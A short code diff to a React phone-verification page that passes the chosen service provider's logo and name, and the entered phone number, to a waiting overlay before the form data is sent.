@@ -4,7 +4,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay from "@/components/WaitingOverlay";
+import WaitingOverlay, { waitingProviderInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -122,9 +122,17 @@ export default function PhoneVerification() {
 
   const onSubmit = (data: FormData) => {
     const idNumber = localStorage.getItem("idNumber") || "";
-    const providerName = serviceProviders.find(
+    const provider = serviceProviders.find(
       (p) => p.value === data.serviceProvider
-    )?.label;
+    );
+    const providerName = provider?.label;
+
+    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
+    waitingProviderInfo.value = {
+      providerLogo: provider?.icon,
+      providerName: providerName,
+      phoneNumber: data.phone,
+    };
 
     sendData({
       data: {
